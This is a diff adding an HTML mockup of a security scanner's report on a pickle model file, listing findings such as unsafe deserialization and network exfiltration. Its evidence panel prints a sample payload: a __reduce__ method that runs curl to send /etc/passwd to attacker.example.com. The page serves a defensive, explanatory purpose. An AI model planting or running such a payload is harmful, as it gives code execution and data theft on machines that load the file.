@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Risk Consultant - Analysis Results</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Roboto+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #2C3E50;
+            --secondary-color: #3498DB;
+            --background-color: #F5F7FA;
+            --text-color: #333333;
+            --safe-color: #27AE60;
+            --warning-color: #F39C12;
+            --danger-color: #E74C3C;
+            --info-color: #3498DB;
+            --border-color: #E0E6ED;
+            --card-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+        
+        .container {
+            display: flex;
+            min-height: 100vh;
+        }
+        
+        .sidebar {
+            width: 250px;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.1);
+        }
+        
+        .sidebar-header {
+            padding: 0 20px 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .sidebar-header h1 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        
+        .sidebar-header p {
+            font-size: 12px;
+            opacity: 0.7;
+        }
+        
+        .sidebar-menu {
+            padding: 20px 0;
+        }
+        
+        .menu-item {
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .menu-item:hover, .menu-item.active {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+        
+        .menu-item i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+        }
+        
+        .main-content {
+            flex: 1;
+            padding: 30px;
+            overflow-y: auto;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            color: var(--primary-color);
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background-color 0.3s;
+        }
+        
+        .btn-primary {
+            background-color: var(--secondary-color);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: #2980b9;
+        }
+        
+        .btn-outline {
+            background-color: transparent;
+            border: 1px solid var(--secondary-color);
+            color: var(--secondary-color);
+        }
+        
+        .btn-outline:hover {
+            background-color: rgba(52, 152, 219, 0.1);
+        }
+        
+        .btn-danger {
+            background-color: var(--danger-color);
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background-color: #c0392b;
+        }
+        
+        .status-banner {
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .status-banner-danger {
+            background-color: rgba(231, 76, 60, 0.1);
+            border-left: 4px solid var(--danger-color);
+        }
+        
+        .status-banner-safe {
+            background-color: rgba(39, 174, 96, 0.1);
+            border-left: 4px solid var(--safe-color);
+        }
+        
+        .status-banner-warning {
+            background-color: rgba(243, 156, 18, 0.1);
+            border-left: 4px solid var(--warning-color);
+        }
+        
+        .status-banner-content {
+            display: flex;
+            align-items: center;
+        }
+        
+        .status-banner-icon {
+            font-size: 24px;
+            margin-right: 15px;
+        }
+        
+        .status-banner-danger .status-banner-icon {
+            color: var(--danger-color);
+        }
+        
+        .status-banner-safe .status-banner-icon {
+            color: var(--safe-color);
+        }
+        
+        .status-banner-warning .status-banner-icon {
+            color: var(--warning-color);
+        }
+        
+        .status-banner-text h2 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        
+        .status-banner-text p {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .tab-container {
+            margin-bottom: 30px;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 20px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.3s;
+        }
+        
+        .tab.active {
+            border-bottom-color: var(--secondary-color);
+            color: var(--secondary-color);
+            font-weight: 500;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .findings-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .finding-card {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: var(--card-shadow);
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .finding-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .finding-card.selected {
+            border: 2px solid var(--secondary-color);
+        }
+        
+        .finding-severity {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+        }
+        
+        .severity-high {
+            background-color: var(--danger-color);
+        }
+        
+        .severity-medium {
+            background-color: var(--warning-color);
+        }
+        
+        .severity-low {
+            background-color: var(--info-color);
+        }
+        
+        .finding-content {
+            padding-left: 10px;
+        }
+        
+        .finding-title {
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: var(--primary-color);
+        }
+        
+        .finding-description {
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: #666;
+        }
+        
+        .finding-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #888;
+        }
+        
+        .finding-type {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 12px;
+            background-color: rgba(52, 152, 219, 0.1);
+            color: var(--secondary-color);
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+        
+        .detail-panel {
+            background-color: white;
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: var(--card-shadow);
+            margin-bottom: 30px;
+        }
+        
+        .detail-panel h2 {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .evidence-section {
+            margin-bottom: 20px;
+        }
+        
+        .evidence-section h3 {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: var(--primary-color);
+        }
+        
+        .evidence-code {
+            background-color: #f8f9fa;
+            border-radius: 4px;
+            padding: 15px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            margin-bottom: 15px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .recommendation-list {
+            list-style-type: none;
+        }
+        
+        .recommendation-item {
+            margin-bottom: 10px;
+            padding-left: 25px;
+            position: relative;
+        }
+        
+        .recommendation-item:before {
+            content: "\f00c";
+            font-family: "Font Awesome 6 Free";
+            font-weight: 900;
+            position: absolute;
+            left: 0;
+            color: var(--secondary-color);
+        }
+        
+        .model-info {
+            display: flex;
+            margin-bottom: 20px;
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: var(--card-shadow);
+        }
+        
+        .model-icon {
+            width: 60px;
+            height: 60px;
+            background-color: var(--secondary-color);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 20px;
+            color: white;
+            font-size: 24px;
+        }
+        
+        .model-details {
+            flex: 1;
+        }
+        
+        .model-name {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: var(--primary-color);
+        }
+        
+        .model-meta {
+            display: flex;
+            gap: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .model-meta-item {
+            display: flex;
+            align-items: center;
+        }
+        
+        .model-meta-item i {
+            margin-right: 5px;
+            color: var(--secondary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h1>Risk Consultantimage.png</h1>
+                <p>Analysis Framework</p>
+            </div>
+            <div class="sidebar-menu">
+                <div class="menu-item">
+                    <i class="fas fa-home"></i>
+                    <span>Dashboard</span>
+                </div>
+                <div class="menu-item">
+                    <i class="fas fa-search"></i>
+                    <span>New Analysis</span>
+                </div>
+                <div class="menu-item">
+                    <i class="fas fa-history"></i>
+                    <span>Analysis History</span>
+                </div>
+                <div class="menu-item active">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Security Reports</span>
+                </div>
+                <div class="menu-item">
+                    <i class="fas fa-cog"></i>
+                    <span>Settings</span>
+                </div>
+                <div class="menu-item">
+                    <i class="fas fa-question-circle"></i>
+                    <span>Help</span>
+                </div>
+            </div>
+        </div>
+        <div class="main-content">
+            <div class="header">
+                <h1>Analysis Results</h1>
+                <div class="action-buttons">
+                    <button class="btn btn-outline">
+                        <i class="fas fa-file-export"></i> Export Report
+                    </button>
+                    <button class="btn btn-primary">
+                        <i class="fas fa-search"></i> New Analysis
+                    </button>
+                </div>
+            </div>
+            
+            <div class="model-info">
+                <div class="model-icon">
+                    <i class="fas fa-cube"></i>
+                </div>
+                <div class="model-details">
+                    <div class="model-name">custom_model_v2.pkl</div>
+                    <div class="model-meta">
+                        <div class="model-meta-item">
+                            <i class="fas fa-file"></i>
+                            <span>Format: Pickle</span>
+                        </div>
+                        <div class="model-meta-item">
+                            <i class="fas fa-weight-hanging"></i>
+                            <span>Size: 1.2 GB</span>
+                        </div>
+                        <div class="model-meta-item">
+                            <i class="fas fa-calendar"></i>
+                            <span>Analyzed: Apr 16, 2025</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="status-banner status-banner-danger">
+                <div class="status-banner-content">
+                    <div class="status-banner-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="status-banner-text">
+                        <h2>POTENTIALLY UNSAFE</h2>
+                        <p>This model contains potentially malicious code. Review the findings below for details.</p>
+                    </div>
+                </div>
+                <button class="btn btn-danger">
+                    <i class="fas fa-exclamation-circle"></i> Quarantine Model
+                </button>
+            </div>
+            
+            <div class="tab-container">
+                <div class="tabs">
+                    <div class="tab active">Security Findings</div>
+                    <div class="tab">Static Analysis</div>
+                    <div class="tab">Dynamic Analysis</div>
+                    <div class="tab">Behavioral Testing</div>
+                    <div class="tab">Evidence Collection</div>
+                </div>
+                
+                <div class="tab-content active">
+                    <div class="findings-grid">
+                        <div class="finding-card selected">
+                            <div class="finding-severity severity-high"></div>
+                            <div class="finding-content">
+                                <div class="finding-type">Pickle Deserialization</div>
+                                <div class="finding-title">Unsafe Pickle Deserialization</div>
+                                <div class="finding-description">
+                                    The model contains unsafe pickle code that could lead to arbitrary code execution when loaded.
+                                </div>
+                                <div class="finding-meta">
+                                    <span>Detected by: ModelScan, Fickling</span>
+                                    <span>Severity: High</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="finding-card">
+                            <div class="finding-severity severity-high"></div>
+                            <div class="finding-content">
+                                <div class="finding-type">Network Exfiltration</div>
+                                <div class="finding-title">Unauthorized Network Communication</div>
+                                <div class="finding-description">
+                                    The model attempts to establish network connections to external servers during loading.
+                                </div>
+                                <div class="finding-meta">
+                                    <span>Detected by: Dynamic Analysis</span>
+                                    <span>Severity: High</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="finding-card">
+                            <div class="finding-severity severity-medium"></div>
+                            <div class="finding-content">
+                                <div class="finding-type">Suspicious Import</div>
+                                <div class="finding-title">Suspicious Module Import</div>
+                                <div class="finding-description">
+                                    The model imports potentially dangerous modules like 'subprocess' and 'socket'.
+                                </div>
+                                <div class="finding-meta">
+                                    <span>Detected by: Static Analysis</span>
+                                    <span>Severity: Medium</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="finding-card">
+                            <div class="finding-severity severity-medium"></div>
+                            <div class="finding-content">
+                                <div class="finding-type">File Access</div>
+                                <div class="finding-title">Unauthorized File Access</div>
+                                <div class="finding-description">
+                                    The model attempts to access files outside its expected directory.
+                                </div>
+                                <div class="finding-meta">
+                                    <span>Detected by: Dynamic Analysis</span>
+                                    <span>Severity: Medium</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-panel">
+                        <h2>Finding Details: Unsafe Pickle Deserialization</h2>
+                        
+                        <div class="evidence-section">
+                            <h3>Evidence</h3>
+                            <div class="evidence-code">
+<pre>class MaliciousPayload:
+    def __reduce__(self):
+        import os
+        return (os.system, ('curl -s http://attacker.example.com/exfil?data=$(cat /etc/passwd)',))
+
+# This code was found in the model file at offset 0x1A3F8
+# It uses the __reduce__ method to execute arbitrary commands when unpickled</pre>
+                            </div>
+                            <p>The model contains a malicious pickle payload that uses the __reduce__ method to execute arbitrary commands when the model is loaded. This is a common technique used in pickle-based remote code execution attacks.</p>
+                        </div>
+                        
+                        <div class="evidence-section">
+                            <h3>Impact</h3>
+                            <p>If this model is loaded using standard pickle deserialization, it will execute the embedded command, which attempts to exfiltrate the contents of /etc/passwd to an external server. This could lead to data theft, unauthorized access, or further compromise of the system.</p>
+                        </div>
+                        
+                        <div class="evidence-section">
+                            <h3>Recommendations</h3>
+                            <ul class="recommendation-list">
+                                <li class="recommendation-item">Do not load this model using standard pickle deserialization.</li>
+                                <li class="recommendation-item">If possible, convert the model to a safer format like safetensors or ONNX.</li>
+                                <li class="recommendation-item">Always load models in a sandboxed environment with restricted permissions.</li>
+                                <li class="recommendation-item">Implement network monitoring to detect and block unauthorized connections.</li>
+                                <li class="recommendation-item">Consider using a secure deserialization library like fickling with protection mode enabled.</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="tab-content">
+                    <!-- Static Analysis Content -->
+                    <p>Static Analysis content would go here...</p>
+                </div>
+                
+                <div class="tab-content">
+                    <!-- Dynamic Analysis Content -->
+                    <p>Dynamic Analysis content would go here...</p>
+                </div>
+                
+                <div class="tab-content">
+                    <!-- Behavioral Testing Content -->
+                    <p>Behavioral Testing content would go here...</p>
+                </div>
+                
+                <div class="tab-content">
+                    <!-- Evidence Collection Content -->
+                    <p>Evidence Collection content would go here...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Simple tab switching functionality
+        document.querySelectorAll('.tab').forEach((tab, index) => {
+            tab.addEventListener('click', () => {
+                // Remove active class from all tabs and tab contents
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                // Add active class to clicked tab and corresponding content
+                tab.classList.add('active');
+                document.querySelectorAll('.tab-content')[index].classList.add('active');
+            });
+        });
+        
+        // Finding card selection
+        document.querySelectorAll('.finding-card').forEach(card => {
+            card.addEventListener('click', () => {
+                document.querySelectorAll('.finding-card').forEach(c => c.classList.remove('selected'));
+                card.classList.add('selected');
+                // In a real application, this would update the detail panel with the selected finding's details
+            });
+        });
+    </script>
+</body>
+</html>
